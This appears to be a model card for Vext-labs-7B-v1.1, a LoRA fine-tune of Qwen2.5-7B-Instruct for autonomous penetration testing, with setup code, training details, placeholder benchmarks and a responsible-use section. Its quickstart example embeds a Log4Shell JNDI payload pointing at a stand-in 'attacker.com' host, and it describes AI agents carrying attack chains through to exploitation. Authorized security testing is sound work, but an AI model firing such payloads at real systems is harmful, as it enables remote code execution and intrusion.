<p align="center">
  <img src="https://vext.ai/logo.png" alt="VEXT AI" width="200"/>
</p>

<h1 align="center">Vext-labs-7B-v1.1</h1>
<p align="center"><strong>Autonomous Security Testing Model</strong></p>

<p align="center">
  <a href="https://vext.ai">Website</a> |
  <a href="https://huggingface.co/vext-ai/Vext-labs-7B-v1.1">HuggingFace</a> |
  <a href="#quickstart">Quickstart</a> |
  <a href="#benchmarks">Benchmarks</a>
</p>

---

A security-specialized language model by **VEXT AI** for autonomous penetration testing and vulnerability assessment.

Built as a LoRA adapter on [Qwen/Qwen2.5-7B-Instruct](https://huggingface.co/Qwen/Qwen2.5-7B-Instruct), fine-tuned on real-world security testing data including tool output interpretation, attack planning, vulnerability classification, and remediation guidance.

## What This Model Does

Vext-labs-7B-v1.1 is trained on data from the VEXT autonomous security testing platform:

- **Interpret security tool output** — Parse and reason about results from nuclei, dalfox, sqlmap, gobuster, naabu, and 20+ other security tools
- **Plan attack strategies** — Given a target scope and reconnaissance data, decide which tools to run and in what order
- **Classify vulnerabilities** — Distinguish true positives from false positives
- **Generate remediation advice** — Provide actionable fix recommendations for discovered vulnerabilities

## Quickstart

### With vLLM (Recommended)

```bash
pip install vllm

python -m vllm.entrypoints.openai.api_server \
    --model Qwen/Qwen2.5-7B-Instruct \
    --enable-lora \
    --lora-modules vext-security-v1=./adapter \
    --max-lora-rank 32
```

### With PEFT + Transformers

```python
from peft import PeftModel
from transformers import AutoModelForCausalLM, AutoTokenizer

base = AutoModelForCausalLM.from_pretrained(
    "Qwen/Qwen2.5-7B-Instruct",
    torch_dtype="auto",
    device_map="auto"
)
model = PeftModel.from_pretrained(base, "vext-ai/Vext-labs-7B-v1.1")
tokenizer = AutoTokenizer.from_pretrained("vext-ai/Vext-labs-7B-v1.1")

messages = [
    {
        "role": "system",
        "content": "You are a security testing agent. Analyze the tool output and identify vulnerabilities."
    },
    {
        "role": "user",
        "content": """Nuclei scan results:
[critical] CVE-2021-44228 Log4Shell detected at /api/login
POC: ${jndi:ldap://attacker.com/a}"""
    }
]

text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
inputs = tokenizer(text, return_tensors="pt").to(model.device)
output = model.generate(**inputs, max_new_tokens=512)
print(tokenizer.decode(output[0], skip_special_tokens=True))
```

## Training Details

| Parameter | Value |
|-----------|-------|
| Base model | `Qwen/Qwen2.5-7B-Instruct` |
| Method | LoRA (Low-Rank Adaptation) |
| Rank | 32 |
| Alpha | 64 |
| Target modules | `q_proj, k_proj, v_proj, o_proj, gate_proj, up_proj, down_proj` |
| Training steps | 5,000 |
| Training samples | 436,922 |
| Final loss | 0.51 |
| Precision | bfloat16 |

### Training Data

Fine-tuned on security testing data generated by the VEXT platform:

- **Tool execution traces** — input parameters, raw output, parsed results from 25+ security tools
- **Attack planning decisions** — which tool to use, why, expected outcomes
- **Vulnerability validation** — true positive vs false positive classification with evidence
- **Multi-step attack chains** — reconnaissance through enumeration through exploitation

Data collected from authorized testing against intentionally vulnerable applications (OWASP Juice Shop, DVWA, bWAPP, WebGoat, and others) and authorized bug bounty targets.

## Benchmarks

Results from Juice Shop CTF evaluation (v1.1 model driving 3 autonomous agents):

| Metric | Result |
|--------|--------|
| Vulnerabilities found | TBD |
| Validated findings | TBD |
| False positive rate | TBD |
| Time to first finding | TBD |

*Benchmarks will be updated after the POC evaluation run completes.*

## Model Files

```
adapter_config.json          # PEFT/LoRA configuration
adapter_model.safetensors    # LoRA weight deltas (~308 MB)
tokenizer.json               # Full tokenizer vocabulary
tokenizer_config.json        # Tokenizer settings
chat_template.jinja           # Chat template for inference
```

## Responsible Use

This model is intended for **authorized security testing only**:

- Within the scope of authorized penetration testing engagements
- Against applications you own or have explicit written permission to test
- In CTF competitions and security training environments
- For defensive security research and vulnerability assessment

**Do not use this model for unauthorized access to computer systems.**

## About VEXT AI

VEXT is building autonomous security testing agents that combine LLM reasoning with real security tools. Our agents run full penetration tests — from reconnaissance to exploitation to reporting — with human-level decision making.

Learn more at [vext.ai](https://vext.ai)

## License

Apache 2.0

## Citation

```bibtex
@misc{vext-labs-7b-v1.1,
  title={Vext-labs-7B-v1.1: Security-Specialized Language Model for Autonomous Penetration Testing},
  author={VEXT AI},
  year={2026},
  url={https://github.com/vext-ai/Vext-labs-7B-v1.1}
}
```
